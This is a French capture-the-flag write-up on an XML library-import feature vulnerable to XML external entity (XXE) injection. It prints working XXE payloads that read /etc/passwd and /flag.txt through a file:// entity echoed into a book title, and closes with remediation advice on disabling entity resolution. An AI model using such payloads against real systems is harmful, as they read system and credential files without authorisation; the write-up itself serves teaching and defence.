# BiblioTech — un import XML qui parse mes entités externes (XXE)

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/bibliotech/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — BiblioTech laisse ses membres importer leur bibliothèque en XML, et
> le serveur parse ce XML puis réaffiche les titres. Je déclare une entité
> externe pointant sur un fichier local : le parseur la résout et recrache le
> contenu dans le titre du livre. Je lis d'abord `/etc/passwd` pour confirmer,
> puis `/flag.txt`. **Flag :** `NCTF{…}`.

## 1. Briefing

Un club de lecture en ligne. La fonctionnalité intéressante : « Importer ma
bibliothèque » accepte un fichier XML.

## 2. Reconnaissance

Le lien d'import mène à `/import`, protégé par un petit captcha arithmétique
(une addition rendue en SVG). Une fois résolu, j'accède au formulaire d'upload.
Le format attendu : des `<library>` avec des `<book><title>…</title></book>`.

Le serveur parse mon XML **et** réaffiche les titres dans la page de résultat :
un parseur XML côté serveur plus un retour direct, c'est l'invitation parfaite à
tester une XXE.

## 3. Analyse

Si le parseur résout les entités externes, je peux déclarer une entité qui lit un
fichier local, puis l'utiliser dans un `<title>` — son contenu reviendra dans la
page.

## 4. Exploitation

### Étape 1 — confirmer la XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE library [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<library>
  <book><title>&xxe;</title><author>test</author></book>
</library>
```

J'uploade : le contenu de `/etc/passwd` apparaît dans le titre du livre importé.
Faille confirmée.

### Étape 2 — lire le flag

```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
```

Le flag s'affiche dans la page de résultat.

## 5. Flag

```text
NCTF{…}
```

## 6. Leçons & remédiation

- **Désactiver la résolution des entités externes** et des DTD dans le parseur
  (`resolve_entities=False`, `no_network`, `XMLConstants.FEATURE_SECURE_PROCESSING`
  selon la pile).
- **Ne pas réafficher** le contenu parsé sans contrôle ; valider le document
  contre un schéma strict.
- Le captcha ne protégeait rien ici : il ralentit l'automatisation, pas l'attaque.
